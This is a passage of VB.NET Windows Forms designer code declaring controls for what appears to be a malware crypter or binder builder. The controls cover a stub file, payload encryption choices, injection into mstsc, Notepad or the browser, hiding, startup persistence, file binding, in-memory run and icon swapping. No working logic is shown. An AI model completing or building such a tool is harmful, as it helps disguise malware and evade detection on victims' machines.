    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage4 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage5 As System.Windows.Forms.TabPage
    Friend WithEvents GroupBox2 As System.Windows.Forms.GroupBox
    Friend WithEvents Button2 As System.Windows.Forms.Button
    Friend WithEvents DataKey As System.Windows.Forms.TextBox
    Friend WithEvents Button1 As System.Windows.Forms.Button
    Friend WithEvents TextFile As System.Windows.Forms.TextBox
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents AES256 As System.Windows.Forms.RadioButton
    Friend WithEvents DES As System.Windows.Forms.RadioButton
    Friend WithEvents TripleDES As System.Windows.Forms.RadioButton
    Friend WithEvents AES192 As System.Windows.Forms.RadioButton
    Friend WithEvents AES128 As System.Windows.Forms.RadioButton
    Friend WithEvents RC4Mod As System.Windows.Forms.RadioButton
    Friend WithEvents RC2 As System.Windows.Forms.RadioButton
    Friend WithEvents Button3 As System.Windows.Forms.Button
    Friend WithEvents StubFile As System.Windows.Forms.TextBox
    Friend WithEvents GroupBox3 As System.Windows.Forms.GroupBox
    Friend WithEvents GroupBox4 As System.Windows.Forms.GroupBox
    Friend WithEvents BrowserDefault As System.Windows.Forms.RadioButton
    Friend WithEvents ItSelf As System.Windows.Forms.RadioButton
    Friend WithEvents mstsc As System.Windows.Forms.RadioButton
    Friend WithEvents Notepad As System.Windows.Forms.RadioButton
    Friend WithEvents TabPage6 As System.Windows.Forms.TabPage
    Friend WithEvents GroupBox5 As System.Windows.Forms.GroupBox
    Friend WithEvents TextCustom As System.Windows.Forms.TextBox
    Friend WithEvents Custom As System.Windows.Forms.CheckBox
    Friend WithEvents CheckHide As System.Windows.Forms.CheckBox
    Friend WithEvents CheckStart As System.Windows.Forms.CheckBox
    Friend WithEvents GroupBox6 As System.Windows.Forms.GroupBox
    Friend WithEvents GroupBox7 As System.Windows.Forms.GroupBox
    Friend WithEvents IcoCheck As System.Windows.Forms.CheckBox
    Friend WithEvents Button4 As System.Windows.Forms.Button
    Friend WithEvents IcoText As System.Windows.Forms.TextBox
    Friend WithEvents GroupBox9 As System.Windows.Forms.GroupBox
    Friend WithEvents TextDelay As System.Windows.Forms.TextBox
    Friend WithEvents GroupBox8 As System.Windows.Forms.GroupBox
    Friend WithEvents Binder As System.Windows.Forms.CheckBox
    Friend WithEvents BindBrowse As System.Windows.Forms.Button
    Friend WithEvents TextBind As System.Windows.Forms.TextBox
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents GroupBox10 As System.Windows.Forms.GroupBox
    Friend WithEvents MemRun As System.Windows.Forms.CheckBox
    Friend WithEvents TextInstall As System.Windows.Forms.TextBox
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents RunOnce As System.Windows.Forms.CheckBox
    Friend WithEvents Button6 As System.Windows.Forms.Button
    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
    Friend WithEvents State As System.Windows.Forms.Label
    Friend WithEvents Label4 As System.Windows.Forms.Label

End Class
